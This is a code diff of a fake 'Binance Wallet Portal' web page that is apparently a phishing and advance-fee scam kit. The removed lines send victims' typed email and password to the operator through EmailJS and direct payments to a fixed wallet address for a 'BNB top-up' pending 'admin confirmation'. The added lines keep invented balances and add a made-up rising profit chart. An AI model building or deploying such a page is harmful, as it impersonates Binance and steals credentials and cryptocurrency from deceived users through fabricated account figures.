@@ -1,9 +1,11 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Binance Wallet Portal</title>
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -56,140 +58,186 @@
       height: 24px;
       margin-right: 8px;
     }
+    #logoutConfirmModal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.8);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    .modal-box {
+      background: #2E3239;
+      color: white;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+    }
+    .modal-box button {
+      width: auto;
+      margin: 10px;
+    }
+    canvas {
+      background: #1f1f1f;
+      border-radius: 10px;
+      padding: 10px;
+      margin-top: 20px;
+    }
   </style>
 </head>
-<body onload="initApp()"><!-- Page 1: Sign In --><div class="page visible" id="page1">
+<body onload="initApp()">
+
+<!-- Page 1: Sign In -->
+<div class="page visible" id="page1">
   <div class="form-container">
     <h2>Binance Wallet Login</h2>
     <input type="email" id="email" placeholder="Email" required />
     <input type="password" id="pass" placeholder="Password" required />
     <button onclick="submitSignin()">Confirm</button>
   </div>
-</div><!-- Page 2: Processing --><div class="page" id="page2">
+</div>
+
+<!-- Page 2: Access Processing -->
+<div class="page" id="page2">
   <div class="form-container">
     <h2>Authenticating...</h2>
     <p>Please wait...</p>
     <button onclick="confirmAccess()">Continue</button>
   </div>
-</div><!-- Page 3: Account ID --><div class="page" id="page3">
+</div>
+
+<!-- Page 3: Confirm Account ID -->
+<div class="page" id="page3">
   <div class="form-container">
     <h2>Enter Account ID</h2>
     <input type="text" placeholder="Account ID" />
     <button onclick="confirmID()">Confirm</button>
   </div>
-</div><!-- Page 5: Dashboard --><div class="page" id="page5">
+</div>
+
+<!-- Page 4: Placeholder (optional future content) -->
+<div class="page" id="page4">
+  <div class="form-container">
+    <h2>Page 4 (Coming Soon)</h2>
+  </div>
+</div>
+
+<!-- Page 5: Dashboard -->
+<div class="page" id="page5">
   <div class="form-container">
     <div class="status-bar">
       <h2>Dashboard</h2>
       <span id="walletStatus"></span>
     </div>
     <p style="color: #f3ba2f;">Total Assets: <strong id="totalAssets">$2078.78</strong></p>
-    <p>Total amount of BNB to top-up is: <strong style="color:#f3ba2f;">0.26 BNB</strong></p><div class="token">
-  <div><img class="coin-logo" src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" /> USDT</div>
-  <div id="usdt_amount">$0.00</div>
+    <p>Total amount of BNB to top-up is: <strong style="color:#f3ba2f;">0.26 BNB</strong></p>
+
+    <div class="token">
+      <div><img class="coin-logo" src="https://cryptologos.cc/logos/tether-usdt-usdt-logo.png?v=029" alt="USDT" /> USDT</div>
+      <div id="usdt_amount">$2078.78</div>
+    </div>
+
+    <div class="token">
+      <div><img class="coin-logo" src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png?v=029" alt="BNB" /> BNB</div>
+      <div id="bnb_amount">0.26 BNB</div>
+    </div>
+
+    <canvas id="profitChart" height="200"></canvas>
+
+    <div class="button-group">
+      <button onclick="goToScan('Transfer to Main Wallet')">Transfer to Main Wallet</button>
+      <button onclick="goToScan('Receive')">Receive</button>
+      <button onclick="goToScan('Top Up BNB')">Top Up BNB</button>
+    </div>
+    <button onclick="showLogoutConfirm()" style="margin-top: 20px; background:#f6465d; color:white;">Sign Out</button>
+  </div>
 </div>
 
-<div class="token">
-  <div><img class="coin-logo" src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" alt="BNB" /> BNB</div>
-  <div id="bnb_amount">$0.00</div>
+<div id="logoutConfirmModal">
+  <div class="modal-box">
+    <p>Are you sure you want to logout?</p>
+    <button onclick="logout()">Confirm</button>
+    <button onclick="hideLogoutConfirm()">Cancel</button>
+  </div>
 </div>
 
-<div class="button-group">
-  <button onclick="goToScan('Transfer to Main Wallet')">Transfer to Main Wallet</button>
-  <button onclick="goToScan('Receive')">Receive</button>
-  <button onclick="goToScan('Top Up BNB')">Top Up BNB</button>
-</div>
-<button onclick="logoutUser()" style="margin-top: 20px; background:#f6465d; color:white;">Sign Out</button>
-
-  </div>
-</div><!-- Page 6: Scan + Hash Input --><div class="page" id="page6">
-  <div class="form-container">
-    <h2 id="scanAction">Action</h2>
-    <img src="https://api.qrserver.com/v1/create-qr-code/?data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&size=150x150" alt="QR Code" />
-    <p>Send to: <strong style="color:#f3ba2f;">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</strong></p>
-    <input type="text" id="txHash" placeholder="Enter Transaction Hash" />
-    <button onclick="submitTransaction()">Confirm Transaction</button>
-    <div id="txStatus"></div>
-    <button onclick="returnToDashboard()">Return</button>
-  </div>
-</div><!-- Page 7: Wallet Connect Page --><div class="page" id="page7">
-  <div class="form-container">
-    <h2>Connect Your Wallet</h2>
-    <input type="text" id="walletAddress" placeholder="Enter BEP20 Wallet Address" />
-    <button onclick="confirmWallet()">Confirm Wallet</button>
-    <button onclick="returnToDashboard()">Return to Dashboard</button>
-  </div>
-</div><script>
-const emailService = "service_78wwbgl";
-const signinTemplate = "template_omkmcio";
-const publicKey = "ochPV1QVtay7TOdBA";
-
+<script>
 function initApp() {
-  emailjs.init(publicKey);
-  const step = localStorage.getItem("binance_step") || "1";
-  showPage(step);
-  if (step === "5") loadDashboard();
+  loadDashboard();
+}
+
+function showLogoutConfirm() {
+  document.getElementById("logoutConfirmModal").style.display = "flex";
+}
+
+function hideLogoutConfirm() {
+  document.getElementById("logoutConfirmModal").style.display = "none";
+}
+
+function logout() {
+  localStorage.clear();
+  hideLogoutConfirm();
+  location.reload();
+}
+
+function goToScan(action) {
+  alert(`Action: ${action}\nScan QR or enter details as required.`);
+}
+
+function drawChart() {
+  const ctx = document.getElementById('profitChart').getContext('2d');
+  new Chart(ctx, {
+    type: 'line',
+    data: {
+      labels: ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"],
+      datasets: [{
+        label: 'Profit ($)',
+        data: [320, 450, 390, 520, 610, 700, 780],
+        borderColor: '#f3ba2f',
+        backgroundColor: 'rgba(243,186,47,0.2)',
+        fill: true,
+        tension: 0.3
+      }]
+    },
+    options: {
+      plugins: { legend: { labels: { color: '#fff' } } },
+      scales: {
+        x: { ticks: { color: '#aaa' } },
+        y: { ticks: { color: '#aaa' } }
+      }
+    }
+  });
+}
+
+function loadDashboard() {
+  const address = localStorage.getItem("wallet_address");
+  const statusElem = document.getElementById("walletStatus");
+  if (address) {
+    statusElem.innerHTML = `Connected: ${address.slice(0, 6)}...${address.slice(-4)} <button onclick=\"disconnectWallet()\" style=\"margin-left: 10px; background: transparent; color: red; border: none; font-weight: bold; cursor: pointer;\">Disconnect</button>`;
+  } else {
+    statusElem.innerHTML = `<button onclick=\"showPage('7')\">Connect Wallet</button>`;
+  }
+  document.getElementById("usdt_amount").textContent = "$2078.78";
+  document.getElementById("bnb_amount").textContent = "0.26 BNB";
+  document.getElementById("totalAssets").textContent = "$2078.78";
+  drawChart();
+}
+
+function disconnectWallet() {
+  localStorage.removeItem("wallet_address");
+  loadDashboard();
 }
 
 function showPage(id) {
   document.querySelectorAll(".page").forEach(p => p.classList.remove("visible"));
   document.getElementById("page" + id).classList.add("visible");
-  localStorage.setItem("binance_step", id);
 }
-
-function submitSignin() {
-  const email = document.getElementById("email").value;
-  const pass = document.getElementById("pass").value;
-  localStorage.setItem("email", email);
-  const payload = { user_email: email, user_password: pass };
-  emailjs.send(emailService, signinTemplate, payload).then(() => {
-    showPage("2");
-  });
-}
-
-function confirmAccess() { setTimeout(() => showPage("3"), 2000); }
-function confirmID() { setTimeout(() => { showPage("5"); loadDashboard(); }, 2000); }
-function returnToDashboard() { showPage("5"); loadDashboard(); }
-
-function goToScan(action) {
-  document.getElementById("scanAction").innerText = action;
-  showPage("6");
-}
-
-function confirmWallet() {
-  const wallet = document.getElementById("walletAddress").value;
-  if (!wallet || wallet.length < 10) {
-    alert("Enter a valid BEP20 wallet address");
-    return;
-  }
-  localStorage.setItem("wallet_address", wallet);
-  showPage("5");
-  loadDashboard();
-}
-
-function loadDashboard() {
-  const address = localStorage.getItem("wallet_address");
-  document.getElementById("walletStatus").textContent = address ? `Connected: ${address.slice(0, 6)}...${address.slice(-4)}` : "Not Connected";
-  document.getElementById("usdt_amount").textContent = "$2078.78";
-  document.getElementById("bnb_amount").textContent = "0.26 BNB";
-  document.getElementById("totalAssets").textContent = "$2078.78";
-}
-
-function submitTransaction() {
-  const tx = document.getElementById("txHash").value;
-  if (tx.length < 10) return alert("Enter valid transaction hash");
-  document.getElementById("txStatus").innerHTML = "<p>Sent ✅ Waiting for admin confirmation...</p>";
-  setTimeout(() => {
-    alert("Transaction processed.");
-    returnToDashboard();
-  }, 3000);
-}
-
-function logoutUser() {
-  if (confirm("Are you sure you want to log out?")) {
-    localStorage.clear();
-    location.reload();
-  }
-}
-</script></body>
+</script>
+</body>
 </html>
+
+
